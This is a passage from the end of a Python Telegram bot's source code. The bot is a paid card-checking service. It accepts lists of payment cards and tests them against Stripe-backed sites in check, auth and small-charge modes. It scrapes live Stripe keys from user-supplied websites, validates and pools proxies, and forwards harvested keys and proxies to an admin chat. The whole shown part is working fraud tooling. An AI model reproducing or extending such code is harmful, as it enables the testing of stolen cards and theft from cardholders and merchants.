                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"✅ Live: <b>{len(live)}</b> / {len(lines)}\n"
                   f"👤 <code>{u.id}</code> · @{u.username or '—'}\n\n"
                   f"<code>{html.escape(body)}</code>")
            await send_to_gc(ctx.bot, fwd)
            buf = io.BytesIO("\n".join(p["original"] for p in live).encode())
            buf.name = "live_proxies.txt"
            try:
                await ctx.bot.send_document(
                    int(cfg_get("gc_id", str(OWNER_ID)) or OWNER_ID),
                    document=buf, filename="live_proxies.txt",
                    caption=f"🧦 {len(live)} live proxies")
            except Exception: pass
        await proc.edit_text(
            f"🧦 <b>Proxy check done</b>\n"
            f"✅ Live: <b>{len(live)}</b>\n"
            f"❌ Dead: {len(dead)}\n\n"
            f"Live proxies added to bot pool and sent to admin.",
            parse_mode=ParseMode.HTML)
        return

    # card file
    cards = parse_cards_from_text(text)
    pks = parse_pks_from_text(text)
    if not cards:
        await msg.reply_text("⚠️ No valid cards in file."); return
    # if file contains pk_live keys, use them (add to pool temporarily for this run)
    if pks:
        cfg_set("pk_keys", "\n".join(pks))
        load_pk_pool()
    st["pending_cards"] = cards
    await msg.reply_text(
        f"📄 Loaded <b>{len(cards)}</b> cards"
        + (f" + <b>{len(pks)}</b> pk keys" if pks else "")
        + "\n\nChoose mode:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"💳 Check ({len(cards)})", callback_data="m:start:mass")],
            [InlineKeyboardButton(f"🔐 Auth ({len(cards)})", callback_data="m:start:stauth")],
            [InlineKeyboardButton(f"💥 0.5$ ({len(cards)})", callback_data="m:start:st05")],
            [InlineKeyboardButton("🗑 Clear", callback_data="m:clear")],
        ]))

async def on_text(update, ctx):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    msg = update.effective_message
    text = msg.text or ""
    st = get_state(u.id)

    if st.get("pending") == "awaiting_proxies" and u.id == OWNER_ID:
        st["pending"] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        cfg_set("proxies", "\n".join(lines))
        load_proxy_pool()
        await msg.reply_text(f"🧦 Saved <b>{len(PROXY_CYCLE['pool'])}</b> valid proxies.",
                             parse_mode=ParseMode.HTML); return

    if st.get("pending") == "awaiting_pks" and u.id == OWNER_ID:
        st["pending"] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        valid = [l for l in lines if l.startswith("pk_live_")]
        cfg_set("pk_keys", "\n".join(valid))
        load_pk_pool()
        await msg.reply_text(f"🔑 Saved <b>{len(valid)}</b> valid pk keys.",
                             parse_mode=ParseMode.HTML); return

    if st.get("pending") == "awaiting_proxies_check":
        st["pending"] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await msg.reply_text("⚠️ Nothing."); return
        proc = await msg.reply_text(f"🧦 Testing {len(lines)} proxies…")
        loop = asyncio.get_event_loop()
        live, dead = await loop.run_in_executor(None, proxy_check_bulk, lines)
        existing_raw = cfg_get("proxies", "") or ""
        existing = set(l.strip() for l in existing_raw.splitlines() if l.strip())
        for p in live: existing.add(p["original"])
        cfg_set("proxies", "\n".join(sorted(existing)))
        load_proxy_pool()
        if live:
            body = "\n".join(p["original"] for p in live[:50])
            fwd = (f"🧦 <b>LIVE PROXIES</b>\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"✅ Live: <b>{len(live)}</b> / {len(lines)}\n"
                   f"👤 <code>{u.id}</code> · @{u.username or '—'}\n\n"
                   f"<code>{html.escape(body)}</code>")
            await send_to_gc(ctx.bot, fwd)
        await proc.edit_text(
            f"🧦 Done.\n✅ Live: <b>{len(live)}</b>\n❌ Dead: {len(dead)}\n\n"
            f"Added to pool.",
            parse_mode=ParseMode.HTML); return

    if st.get("pending") == "awaiting_sites_for_key":
        st["pending"] = None
        n = st.get("pending_key_count") or 5
        sites = [s.strip().replace("https://","").replace("http://","").split("/")[0]
                 for s in text.splitlines() if s.strip()][:n]
        if not sites:
            await msg.reply_text("⚠️ No sites."); return
        m2 = await msg.reply_text(f"🌐 Extracting from {len(sites)} sites…")
        loop = asyncio.get_event_loop()
        found = []
        for s in sites:
            k = await loop.run_in_executor(None, get_stripe_key, s, None)
            if k: found.append((s, k))
        if not found:
            await m2.edit_text("❌ No pk_live keys found.", parse_mode=ParseMode.HTML); return
        for site, key in found:
            fwd = (f"🔑 <b>PK_LIVE KEY FOUND</b>\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"🌐 <code>{html.escape(site)}</code>\n"
                   f"🔑 <code>{key}</code>\n"
                   f"👤 <code>{u.id}</code> · @{u.username or '—'}")
            await send_to_gc(ctx.bot, fwd)
        await m2.edit_text(
            f"✅ <b>{len(found)} key(s) extracted</b>\nSent to admin.\n\n"
            f"<i>Keys are not shown to protect them.</i>",
            parse_mode=ParseMode.HTML); return

    # card auto-detect
    cards = parse_cards_from_text(text)
    pks = parse_pks_from_text(text)
    if cards:
        if user_is_banned(u.id):
            await msg.reply_text("🚫 Banned."); return
        if not user_has_plan(u.id):
            await msg.reply_text("🚫 No plan.", parse_mode=ParseMode.HTML); return
        if pks:
            cfg_set("pk_keys", "\n".join(pks))
            load_pk_pool()
        st["pending_cards"] = cards
        await msg.reply_text(
            f"💳 Detected <b>{len(cards)}</b> cards"
            + (f" + <b>{len(pks)}</b> pk keys" if pks else "")
            + "\n\nChoose mode:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"💳 Check ({len(cards)})", callback_data="m:start:mass")],
                [InlineKeyboardButton(f"🔐 Auth ({len(cards)})", callback_data="m:start:stauth")],
                [InlineKeyboardButton(f"💥 0.5$ ({len(cards)})", callback_data="m:start:st05")],
                [InlineKeyboardButton("🗑 Clear", callback_data="m:clear")],
            ]))
        return

    # single card via /st is a command, ignore here
    await msg.reply_text("❓ Unknown input. /help", reply_markup=back_main_kb())

# ===================== BOOT =====================
BOT_APP = None

def main():
    global BOT_APP
    init_db()
    load_proxy_pool()
    load_pk_pool()
    BOT_APP = Application.builder().token(BOT_TOKEN).build()

    BOT_APP.add_handler(MessageHandler(filters.ALL, banned_guard), group=-1)
    BOT_APP.add_handler(CallbackQueryHandler(banned_guard), group=-1)

    BOT_APP.add_handler(CommandHandler("start", cmd_start))
    BOT_APP.add_handler(CommandHandler("help", cmd_help))
    BOT_APP.add_handler(CommandHandler("me", cmd_me))
    BOT_APP.add_handler(CommandHandler("redeem", cmd_redeem))
    BOT_APP.add_handler(CommandHandler("st", cmd_single))
    BOT_APP.add_handler(CommandHandler("stauth", cmd_stauth))
    BOT_APP.add_handler(CommandHandler("st0.5", cmd_st05))
    BOT_APP.add_handler(CommandHandler("mass", cmd_mass))
    BOT_APP.add_handler(CommandHandler("key", cmd_key))
    BOT_APP.add_handler(CommandHandler("check", cmd_check))

    BOT_APP.add_handler(CommandHandler("admin", cmd_admin))
    BOT_APP.add_handler(CommandHandler("genkey", cmd_genkey))
    BOT_APP.add_handler(CommandHandler("broadcast", cmd_broadcast))
    BOT_APP.add_handler(CommandHandler("users", cmd_users))
    BOT_APP.add_handler(CommandHandler("stats", cmd_stats))
    BOT_APP.add_handler(CommandHandler("ban", cmd_ban))
    BOT_APP.add_handler(CommandHandler("unban", cmd_unban))
    BOT_APP.add_handler(CommandHandler("revoke", cmd_revoke))
    BOT_APP.add_handler(CommandHandler("banned", cmd_banned_list))

    BOT_APP.add_handler(CommandHandler("addadmin", cmd_addadmin))
    BOT_APP.add_handler(CommandHandler("deladmin", cmd_deladmin))
    BOT_APP.add_handler(CommandHandler("setgc", cmd_setgc))
    BOT_APP.add_handler(CommandHandler("getgc", cmd_getgc))
    BOT_APP.add_handler(CommandHandler("setsite", cmd_setsite))
    BOT_APP.add_handler(CommandHandler("setauthsite", cmd_setsite_auth))
    BOT_APP.add_handler(CommandHandler("set05site", cmd_setsite_05))
    BOT_APP.add_handler(CommandHandler("sites", cmd_sites))
    BOT_APP.add_handler(CommandHandler("setproxies", cmd_setproxies))
    BOT_APP.add_handler(CommandHandler("clearproxies", cmd_clearproxies))
    BOT_APP.add_handler(CommandHandler("getproxies", cmd_getproxies))
    BOT_APP.add_handler(CommandHandler("setpks", cmd_setpks))
    BOT_APP.add_handler(CommandHandler("clearpks", cmd_clearpks))
    BOT_APP.add_handler(CommandHandler("getpks", cmd_getpks))
    BOT_APP.add_handler(CommandHandler("sethcaptcha", cmd_sethcaptcha))
    BOT_APP.add_handler(CommandHandler("clearhcaptcha", cmd_clearhcaptcha))
    BOT_APP.add_handler(CommandHandler("charges", cmd_charges))

    BOT_APP.add_handler(CallbackQueryHandler(on_callback))
    BOT_APP.add_handler(MessageHandler(filters.Document.TXT, on_document))
    BOT_APP.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print(f"🤖 {BOT_NAME} starting…")
    BOT_APP.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()